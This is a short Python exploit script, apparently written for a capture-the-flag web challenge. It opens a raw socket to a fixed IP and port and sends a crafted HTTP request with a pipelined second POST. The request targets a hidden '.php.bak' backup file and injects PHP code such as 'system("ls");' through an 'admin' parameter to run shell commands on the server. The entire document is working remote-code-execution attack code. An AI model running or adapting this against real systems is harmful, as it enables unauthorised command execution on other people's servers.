#!/usr/bin/env python3
import socket
import urllib.parse
import re

host = '61.147.171.105'
port = 58039

def run_command(command):
    print(f"[*] Executing: {command}")
    
    # Payload similar to successful P8 test
    # POST to .bak (with command) + Pipelined POST to .php (dummy)
    
    post_body = 'admin=' + urllib.parse.quote(command)
    content_len = len(post_body)
    
    payload = (
        f'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        f'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: {content_len}\r\n'
        '\r\n'
        f'{post_body}'
        'POST /aaaaa.php HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        'Content-Length: 0\r\n'
        '\r\n'
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(payload.encode())
        
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        
        decoded = response.decode('utf-8', errors='replace')
        
        # Extract body (skip headers)
        if '\r\n\r\n' in decoded:
            body = decoded.split('\r\n\r\n', 1)[1]
            print(body)
        else:
            print(decoded)
            
    except Exception as e:
        print(f"Error: {e}")
    print("=" * 60)

commands = [
    'system("ls");',
]

for cmd in commands:
    run_command(cmd)
